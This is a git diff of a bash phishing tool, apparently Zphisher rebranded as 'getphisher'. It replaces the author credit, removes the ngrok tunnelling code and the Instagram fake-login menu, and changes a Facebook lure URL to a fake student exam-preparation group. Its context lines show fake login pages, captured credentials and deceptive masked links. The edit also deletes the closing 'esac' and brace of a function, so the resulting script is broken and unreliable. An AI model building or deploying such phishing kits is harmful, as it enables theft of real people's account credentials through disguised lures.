@@ -1,9 +1,9 @@
 #!/bin/bash
 
-##   Zphisher 	: 	Automated Phishing Tool
-##   Author 	: 	TAHMID RAYAT 
+##   getphisher 	: 	Automated Phishing Tool
+##   Author 	:Onan Basnet
 ##   Version 	: 	2.2
-##   Github 	: 	https://github.com/htr-tech
+##   Github 	: 	https://github.com/onan-basnet
 
 ##   THANKS TO :
 ##   Aditya Shakya - https://github.com/adi1090x
@@ -153,14 +153,15 @@ kill_pid() {
 banner() {
 	cat <<- EOF
 		${ORANGE}
-		${ORANGE} ______      _     _     _               
-		${ORANGE}|___  /     | |   (_)   | |              
-		${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __ 
-		${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
-		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
-		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
-		${ORANGE}      | |                                
-		${ORANGE}      |_|                ${RED}Version : 2.2
+		${ORANGE} ---------------------------------------------              
+		${ORANGE}| Get.......P....H...I....S....H....E...R     /
+		${ORANGE} | Get.......P....H...I....S....H....E...R.  /
+		${ORANGE}|  Get.......P....H...I....S....H....E...R  /
+		${ORANGE} |Get.......P....H...I....S....H....E...R. /
+		${ORANGE} |Get.......P....H...I....S....H....E...R /
+		${ORANGE}| Get.......P....H...I....S....H....E...R/                              
+
+		${ORANGE}                 ${RED}Version : 2.2
 
 		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by Onan Basnet ${WHITE}
 	EOF
@@ -216,24 +217,8 @@ dependencies() {
 
 }
 
-## Download Ngrok
-download_ngrok() {
-	url="$1"
-	file=`basename $url`
-	if [[ -e "$file" ]]; then
-		rm -rf "$file"
-	fi
-	wget --no-check-certificate "$url" > /dev/null 2>&1
-	if [[ -e "$file" ]]; then
-		unzip "$file" > /dev/null 2>&1
-		mv -f ngrok .server/ngrok > /dev/null 2>&1
-		rm -rf "$file" > /dev/null 2>&1
-		chmod +x .server/ngrok > /dev/null 2>&1
-	else
-		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Ngrok manually."
-		{ reset_color; exit 1; }
-	fi
-}
+
+
 
 ## Download Cloudflared
 download_cloudflared() {
@@ -252,25 +237,9 @@ download_cloudflared() {
 	fi
 }
 
-## Install ngrok
-install_ngrok() {
-	if [[ -e ".server/ngrok" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
-	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
-		arch=`uname -m`
-		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
-		elif [[ "$arch" == *'aarch64'* ]]; then
-			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip'
-		elif [[ "$arch" == *'x86_64'* ]]; then
-			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
-		else
-			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
-		fi
-	fi
 
-}
+		
+
 
 ## Install Cloudflared
 install_cloudflared() {
@@ -385,28 +354,6 @@ capture_data() {
 	done
 }
 
-## Start ngrok
-start_ngrok() {
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
-	{ sleep 1; setup_site; }
-	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
-
-    if [[ `command -v termux-chroot` ]]; then
-        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to Mustakim Ahmed (https://github.com/BDhackers009)
-    else
-        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
-    fi
-
-	{ sleep 8; clear; banner_small; }
-	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
-	ngrok_url1=${ngrok_url#https://}
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
-	capture_data
-}
-
-
-## DON'T COPY PASTE WITHOUT CREDIT DUDE :')
 
 ## Start Cloudflared
 start_cloudflared() { 
@@ -477,7 +424,7 @@ site_facebook() {
 	case $REPLY in 
 		1 | 01)
 			website="facebook"
-			mask='http://blue-verified-badge-for-facebook-free'
+			mask='http://ble-exam-preparation-group-for-students'
 			tunnel_menu;;
 		2 | 02)
 			website="fb_advanced"
@@ -494,44 +441,8 @@ site_facebook() {
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; clear; banner_small; site_facebook; };;
-	esac
-}
+	
 
-## Instagram
-site_instagram() {
-	cat <<- EOF
-
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
-		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
-		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page
-
-	EOF
-
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
-
-	case $REPLY in 
-		1 | 01)
-			website="instagram"
-			mask='http://get-unlimited-followers-for-instagram'
-			tunnel_menu;;
-		2 | 02)
-			website="ig_followers"
-			mask='http://get-unlimited-followers-for-instagram'
-			tunnel_menu;;
-		3 | 03)
-			website="insta_followers"
-			mask='http://get-1000-followers-for-instagram'
-			tunnel_menu;;
-		4 | 04)
-			website="ig_verify"
-			mask='http://blue-badge-verify-for-instagram-free'
-			tunnel_menu;;
-		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-			{ sleep 1; clear; banner_small; site_instagram; };;
-	esac
-}
 
 ## Gmail/Google
 site_gmail() {
